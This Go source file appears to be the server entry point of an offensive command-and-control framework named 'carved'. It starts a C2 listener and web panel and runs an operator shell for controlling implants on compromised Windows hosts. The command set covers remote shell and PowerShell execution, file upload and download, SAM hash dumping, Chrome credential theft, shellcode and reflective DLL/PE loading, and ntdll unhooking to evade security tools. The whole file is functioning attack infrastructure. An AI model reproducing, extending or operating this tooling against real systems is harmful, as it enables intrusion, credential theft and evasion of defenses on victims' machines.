package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/carved4/carved/server/pkg/api"
	"github.com/carved4/carved/server/pkg/db"
	"github.com/carved4/carved/server/pkg/listeners"
	"github.com/carved4/carved/server/pkg/web"
	"github.com/carved4/carved/shared/crypto"
	"github.com/carved4/carved/shared/proto"
)

var EncryptionKey = ""

func main() {

	apiPort := flag.Int("port", 9000, "API server port")
	listenerPort := flag.Int("listener", 8443, "C2 listener port")
	dbPath := flag.String("db", "carved.db", "Database path")
	flag.Parse()

	fmt.Println(` ▄████▄   ▄▄▄       ██▀███   ██▒   █▓▓█████ ▓█████▄
▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▒██▀ ██▌
▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒ ▓██  █▒░▒███   ░██   █▌
▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ░▓█▄   ▌
▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒   ▒▀█░  ░▒████▒░▒████▓
░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░ ▒▒▓  ▒
  ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░ ░ ▒  ▒
░          ░   ▒     ░░   ░      ░░     ░    ░ ░  ░
░ ░            ░  ░   ░           ░     ░  ░   ░
░                                ░           ░      `)

	if EncryptionKey != "" {
		if err := crypto.SetKey(EncryptionKey); err != nil {
			fmt.Printf("[-] invalid encryption key: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("[+] encryption enabled")
	}

	fmt.Printf("[+] initializing database: %s\n", *dbPath)
	if err := db.Init(*dbPath); err != nil {
		fmt.Printf("[-] database init failed: %v\n", err)
		os.Exit(1)
	}
	defer db.Close()

	lm := listeners.NewManager()

	defaultListener := &db.Listener{
		ID:      "default",
		Name:    "default",
		Type:    "http",
		Host:    "0.0.0.0",
		Port:    uint16(*listenerPort),
		Active:  true,
		Created: time.Now(),
	}
	if err := lm.Start(defaultListener); err != nil {
		fmt.Printf("[-] failed to start default listener: %v\n", err)
		os.Exit(1)
	}

	apiServer := api.NewServer(lm)

	apiAddr := fmt.Sprintf(":%d", *apiPort)

	// Check if TLS certificates exist
	certPath := "server.crt"
	keyPath := "server.key"
	_, certErr := os.Stat(certPath)
	_, keyErr := os.Stat(keyPath)
	useTLS := certErr == nil && keyErr == nil

	if useTLS {
		fmt.Printf("[+] starting api server on %s (HTTPS)\n", apiAddr)
	} else {
		fmt.Printf("[+] starting api server on %s (HTTP)\n", apiAddr)
	}

	go func() {
		var err error
		if useTLS {
			err = http.ListenAndServeTLS(apiAddr, certPath, keyPath, apiServer.Router())
		} else {
			err = http.ListenAndServe(apiAddr, apiServer.Router())
		}
		if err != nil {
			fmt.Printf("[-] api server error: %v\n", err)
		}
	}()

	username, password := web.GetCredentials()

	protocol := "http"
	if useTLS {
		protocol = "https"
	}

	fmt.Println("[+] server started successfully")
	fmt.Println("")
	fmt.Printf("    web panel: %s://0.0.0.0%s\n", protocol, apiAddr)
	fmt.Printf("    API:       %s://0.0.0.0%s/api\n", protocol, apiAddr)
	fmt.Printf("    C2:        %s://0.0.0.0:%d\n", protocol, *listenerPort)
	fmt.Println("")
	fmt.Println("    access via your public IP or hostname")
	fmt.Printf("    login: %s / %s\n", username, password)
	fmt.Println("")

	go func() {
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan
		fmt.Println("\n[-] shutting down...")
		os.Exit(0)
	}()

	runCLI()
}

var currentImplant *db.Implant

func runCLI() {
	reader := bufio.NewReader(os.Stdin)

	for {
		prompt := "carved"
		if currentImplant != nil {
			prompt = fmt.Sprintf("carved (%s@%s)", currentImplant.Username, currentImplant.Hostname)
		}
		fmt.Printf("%s> ", prompt)

		line, err := reader.ReadString('\n')
		if err != nil {
			continue
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]
		args := parts[1:]

		switch cmd {
		case "help", "?":
			printHelp()
		case "implants", "sessions":
			listImplants()
		case "clear":
			clearImplants()
		case "use", "interact":
			if len(args) < 1 {
				fmt.Println("Usage: use <implant-id>")
				continue
			}
			useImplant(args[0])
		case "back":
			currentImplant = nil
		case "info":
			showImplantInfo()
		case "tasks":
			showTasks()
		case "shell":
			if len(args) < 1 {
				fmt.Println("Usage: shell <command>")
				continue
			}
			queueTask(proto.TaskShell, []string{strings.Join(args, " ")}, nil)
		case "powershell", "psh":
			if len(args) < 1 {
				fmt.Println("Usage: powershell <command>")
				continue
			}
			queueTask(proto.TaskPowershell, []string{strings.Join(args, " ")}, nil)
		case "ps":
			queueTask(proto.TaskPS, nil, nil)
		case "pwd":
			queueTask(proto.TaskPWD, nil, nil)
		case "cd":
			if len(args) < 1 {
				fmt.Println("Usage: cd <path>")
				continue
			}
			queueTask(proto.TaskCD, args, nil)
		case "ls":
			queueTask(proto.TaskLS, args, nil)
		case "cat":
			if len(args) < 1 {
				fmt.Println("Usage: cat <file>")
				continue
			}
			queueTask(proto.TaskCat, args, nil)
		case "upload":
			if len(args) < 2 {
				fmt.Println("Usage: upload <local-file> <remote-path>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("[-] failed to read file: %v\n", err)
				continue
			}
			queueTask(proto.TaskUpload, []string{args[1]}, data)
		case "download":
			if len(args) < 1 {
				fmt.Println("Usage: download <remote-file>")
				continue
			}
			queueTask(proto.TaskDownload, args, nil)
		case "whoami":
			queueTask(proto.TaskWhoami, nil, nil)
		case "env":
			queueTask(proto.TaskEnv, nil, nil)
		case "hashdump":
			queueTask(proto.TaskHashdump, nil, nil)
		case "chrome":
			queueTask(proto.TaskChrome, nil, nil)
		case "unhook":
			queueTask(proto.TaskUnhook, nil, nil)
		case "sleep":
			if len(args) < 1 {
				fmt.Println("Usage: sleep <seconds> [jitter%]")
				continue
			}
			queueTask(proto.TaskSleep, args, nil)
		case "kill":
			if len(args) < 1 {
				fmt.Println("Usage: kill <pid>")
				continue
			}
			queueTask(proto.TaskKill, args, nil)
		case "execute":
			if len(args) < 1 {
				fmt.Println("Usage: execute <shellcode-file>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("[-] failed to read shellcode: %v\n", err)
				continue
			}
			queueTask(proto.TaskExecute, nil, data)
		case "loaddll":
			if len(args) < 1 {
				fmt.Println("Usage: loaddll <dll-file>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("[-] failed to read dll: %v\n", err)
				continue
			}
			queueTask(proto.TaskLoadDLL, nil, data)
		case "loadpe":
			if len(args) < 1 {
				fmt.Println("Usage: loadpe <pe-file>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("[-] failed to read pe: %v\n", err)
				continue
			}
			queueTask(proto.TaskLoadPE, nil, data)
		case "exit", "quit":
			if currentImplant != nil {
				currentImplant = nil
			} else {
				fmt.Println("[*] bye!")
				os.Exit(0)
			}
		default:
			fmt.Printf("unknown command: %s (type 'help' for commands)\n", cmd)
		}
	}
}

func printHelp() {
	help := `
Commands:
  implants          - list all implants
  clear             - clear all implants from database
  use <id>          - interact with an implant
  back              - deselect current implant
  info              - show current implant info
  tasks             - show tasks for current implant

Implant Commands (requires 'use' first):
  shell <cmd>       - execute shell command (cmd.exe)
  powershell <cmd>  - execute PowerShell command
  ps                - list processes
  pwd               - print working directory
  cd <path>         - change directory
  ls [path]         - list directory
  cat <file>        - read file
  upload <l> <r>    - upload local file to remote path
  download <file>   - download file
  whoami            - current user info
  env               - environment variables
  sleep <s> [j%]    - set sleep time and jitter
  kill <pid>        - kill process

Credential Extraction:
  hashdump          - dump SAM/SYSTEM hashes
  chrome            - extract Chrome credentials

Execution:
  execute <file>    - execute shellcode
  loaddll <file>    - reflective DLL load
  loadpe <file>     - reflective PE load

Evasion:
  unhook            - unhook ntdll.dll

  exit/quit         - exit (or deselect implant)
`
	fmt.Println(help)
}

func listImplants() {
	implants, err := db.GetAllImplants()
	if err != nil {
		fmt.Printf("[-] database error: %v\n", err)
		return
	}

	if len(implants) == 0 {
		fmt.Println("[+] no implants connected")
		return
	}

	fmt.Println("")
	fmt.Printf("%-36s %-12s %-12s %-6s %-5s %-12s\n", "ID", "USER", "HOST", "PID", "ELEV", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 90))
	for _, i := range implants {
		admin := " "
		if i.Elevated {
			admin = "*"
		}
		lastSeen := i.LastSeen.Format("15:04:05")

		fmt.Printf("%-36s %-12s %-12s %-6d %-5s %-12s\n",
			i.ID, truncate(i.Username, 12), truncate(i.Hostname, 12), i.PID, admin, lastSeen)
	}
	fmt.Println("")
}

func clearImplants() {
	if err := db.ClearImplants(); err != nil {
		fmt.Printf("[-] failed to clear implants: %v\n", err)
		return
	}
	currentImplant = nil
	fmt.Println("[+] cleared all implants and tasks from database")
}

func truncate(s string, max int) string {
	if len(s) > max {
		return s[:max-1] + "…"
	}
	return s
}

func useImplant(id string) {
	implants, err := db.GetAllImplants()
	if err != nil {
		fmt.Printf("[-] database error: %v\n", err)
		return
	}
	if len(implants) == 0 {
		fmt.Println("[-] no implants in database")
		return
	}

	id = strings.ToLower(strings.TrimSpace(id))
	for _, i := range implants {

		if strings.HasPrefix(strings.ToLower(i.ID), id) || strings.ToLower(i.ID) == id {
			currentImplant = i
			fmt.Printf("[+] interacting with %s@%s (%s)\n", i.Username, i.Hostname, i.ID[:8])
			return
		}
	}

	fmt.Printf("[-] implant not found: %s\n", id)
	fmt.Println("[+] available implants:")
	for _, i := range implants {
		fmt.Printf("    %s  %s@%s\n", i.ID[:8], i.Username, i.Hostname)
	}
}

func showImplantInfo() {
	if currentImplant == nil {
		fmt.Println("[-] no implant selected (use 'use <id>')")
		return
	}
	i := currentImplant
	fmt.Printf(`
Implant Info:
  ID:        %s
  Hostname:  %s
  Username:  %s
  Domain:    %s
  OS:        %s/%s
  PID:       %d
  Process:   %s
  Elevated:  %v
  Sleep:     %ds (jitter: %d%%)
  First:     %s
  Last:      %s
`,
		i.ID, i.Hostname, i.Username, i.Domain, i.OS, i.Arch,
		i.PID, i.Process, i.Elevated, i.Sleep, i.Jitter,
		i.FirstSeen.Format("2006-01-02 15:04:05"),
		i.LastSeen.Format("2006-01-02 15:04:05"))
}

func showTasks() {
	if currentImplant == nil {
		fmt.Println("[-] no implant selected")
		return
	}
	tasks, err := db.GetTasksForImplant(currentImplant.ID)
	if err != nil {
		fmt.Printf("[-] error: %v\n", err)
		return
	}
	if len(tasks) == 0 {
		fmt.Println("[*] no tasks")
		return
	}

	fmt.Println("")
	for _, t := range tasks {
		fmt.Printf("[%s] %s - %s\n", t.ID[:8], t.Type, t.Status)
		if len(t.Output) > 0 {
			fmt.Printf("%s\n", string(t.Output))
		}
		if t.Error != "" {
			fmt.Printf("Error: %s\n", t.Error)
		}
		fmt.Println("")
	}
}

func queueTask(taskType proto.TaskType, args []string, data []byte) {
	if currentImplant == nil {
		fmt.Println("[-] no implant selected (use 'use <id>')")
		return
	}

	task, err := db.CreateTask(currentImplant.ID, taskType, args, data)
	if err != nil {
		fmt.Printf("[-] failed to create task: %v\n", err)
		return
	}
	fmt.Printf("[+] task queued: %s\n", task.ID[:8])
}
